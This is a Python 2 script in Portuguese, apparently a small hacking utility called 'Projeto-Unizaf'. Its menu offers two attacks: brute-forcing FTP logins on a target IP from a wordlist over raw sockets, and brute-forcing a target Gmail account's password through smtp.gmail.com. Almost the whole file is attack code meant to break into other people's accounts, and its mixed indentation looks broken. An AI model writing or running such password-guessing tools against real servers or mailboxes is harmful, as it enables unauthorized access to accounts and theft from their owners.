# -*- coding: UTF-8 -*-
import socket
import sys
import re
import os
import smtplib

while True:
	print "Bem vindo ao Projeto-Unizaf v1.1  "
	print "Feito por Zian25 | Codinome Zawien-Fox"
	print "Selecione uma opção"
	print "=========================="
	print "|   Brute-force FTP (1)  |"
	print "|   Brute-force SMTP (2) |"
	print "=========================="
	pedido = input('Selecione um modulo: ')
	if pedido == 1 or pedido == 2:
	    os.system("clear");
	    break
	else:
		os.system("clear");

if pedido == 1:
    print "===================="
    print "|  FORÇA-BRUTA FTP |"
    print "===================="
    print "Boa sorte!"
    alvo = raw_input('Digite o ip alvo: ')
    usuario = raw_input('Digite o Usuario: ')
    file = open("ftpword.txt")
    for linha in file.readlines():
        try:
        	print "Tentando com %s:%s "%(usuario,linha)
    		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    		s.connect((alvo, 21))
    		s.recv(1024)
    		s.send("USER "+usuario+"\r\n")
    		s.recv(1024)
    		s.send("PASS "+linha+"\r\n")
    		resultado = s.recv(1024)
   		s.send("QUIT\r\n")

    		if re.search("230", resultado):
    	    	    print "[+] Senha encontrada: %s"%(linha)
            	    break
    		else:
    	    	    print "[-] Sem sucesso [-]\n"
	
	except socket.error:
	    print "Não foi possivel conectar"
	    break

if pedido == 2:
    print "========================"
    print "|Força Bruta SMTP gmail|"
    print "========================"
    s = smtplib.SMTP("smtp.gmail.com", 587)
    s.ehlo()
    s.starttls()
    usuario = raw_input ('Digite o email alvo: ')
    wordlist = open("smtpword.txt")
    for senha in wordlist:
        try:
		s.login(usuario, senha)
		print "[+] Senha Encontrada:%s " %senha
		break
	except smtplib.SMTPAuthenticationError:
		print "[-] Sem sucesso:%s " %senha
	except socket.error:
		print "Não foi possivel conectar"
	except KeyboardInterrupt:
		print "Saindo"
		break
